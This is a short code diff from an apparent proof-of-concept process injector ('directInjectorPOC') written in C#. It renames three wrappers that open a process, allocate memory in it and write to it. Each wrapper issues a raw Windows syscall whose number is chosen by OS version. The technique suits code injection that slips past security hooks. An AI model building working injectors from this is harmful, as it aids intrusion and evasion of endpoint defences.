@@ -127,7 +127,7 @@ namespace directInjectorPOC
             }
         };
 
-        public static NTSTATUS ZwOpenProcess10(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid, string os)
+        public static NTSTATUS ZwOpenProcess(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid, string os)
         {
             byte[] syscall = syscallSkeleton;
             syscall[4] = sysDic[os]["openprocess"];
@@ -180,7 +180,7 @@ namespace directInjectorPOC
             }
         }
 
-        public static NTSTATUS ZwWriteVirtualMemory10(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten, string os)
+        public static NTSTATUS ZwWriteVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten, string os)
         {
             byte[] syscall = syscallSkeleton;
             syscall[4] = sysDic[os]["writevirtualmem"];
@@ -206,7 +206,7 @@ namespace directInjectorPOC
         }
 
 
-        public static NTSTATUS NtAllocateVirtualMemory10(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect, string os)
+        public static NTSTATUS NtAllocateVirtualMemory(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect, string os)
         {
             byte[] syscall = syscallSkeleton;
             syscall[4] = sysDic[os]["allocatevirtualmem"];
